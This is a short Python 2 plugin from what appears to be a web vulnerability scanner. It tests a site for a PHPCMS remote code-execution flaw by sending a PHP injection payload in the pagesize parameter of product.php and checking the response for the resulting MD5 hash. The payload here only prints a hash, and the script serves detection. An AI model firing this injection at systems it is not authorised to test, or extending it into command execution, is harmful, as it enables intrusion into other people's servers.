#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u''
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="phpcms/yp/product.php?pagesize=${@print(md5(NVS_TEST))}"
        url1="yp/product.php?pagesize=${@print(md5(NVS_TEST))}"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)
        geturl1="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url1)        
        response,content=requestUrl(http,geturl1,ob['task_id'],ob['domain_id'])
        if content.find("88012254c0d67baafa1ca2b7e5fb783a")>=0:
            request = getRequest(geturl1)
            response = getResponse(response)
            result.append(getRecord(ob,domain,ob['level'],detail,request,response))
        else:
            response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
            if content.find("88012254c0d67baafa1ca2b7e5fb783a")>=0:
                request = getRequest(geturl)
                response = getResponse(response)
                result.append(getRecord(ob,ob['scheme']+"://"+domain+ob['base_path'],ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:PHPCMSeXECUTECMDSCRPIT.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:PHPCMSeXECUTECMDSCRPIT.py, run_domain function :" + str(e))
    return result